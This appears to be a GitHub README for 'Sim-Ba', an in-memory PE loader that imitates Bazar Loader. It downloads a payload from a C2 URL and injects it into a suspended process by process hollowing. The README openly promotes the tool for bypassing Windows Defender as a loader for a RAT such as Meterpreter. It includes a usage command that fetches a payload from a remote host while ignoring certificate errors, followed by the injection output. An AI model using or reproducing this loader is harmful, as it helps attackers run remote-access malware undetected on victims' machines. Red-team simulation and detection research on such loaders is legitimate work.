# sim-ba
(Sim)ulate (Ba)zar Loader

## Introduction
Sim-Ba is an in-memory PE Loader designed to simulate the behaviour of Bazar Loader. It downloads the payload from C2 URL and uses Process Hollowing method to inject downloaded PE into the new process created in suspended state. Process Hollowing is already a well-known and commonly used injection [technique](https://attack.mitre.org/techniques/T1055/012/) by malware developers. Sim-Ba is a modified version of another Process Hollowing repository: [idan1288/ProcessHollowing32-64](https://github.com/idan1288/ProcessHollowing32-64) 

## Defender Bypass
Sim-Ba can be used as the loader for your favourite RAT. I tested with Meterpreter on updated Win10 (15.11.2020). 

## Usage
```shell
.\sim-ba.exe [Target executable] [Payload URL]

.\sim-ba.exe C:\Windows\system32\cmd.exe https://192.168.56.101/notdetected

[+] Running the target executable.
[+] Process created in suspended state.
[+] Connecting to URL for downloading payload
[*] Connecting using HTTPS
[*] Ignoring SSL Certificate Error
[+] Allocating memory in child process.
[*] Memory allocated. Address: 0x140000000
[+] Writing executable image into child process.
[*] New entry point: 0x140004000
[+] Setting the context of the child process's primary thread.
[+] Resuming child process's primary thread.
[+] Thread resumed.
```
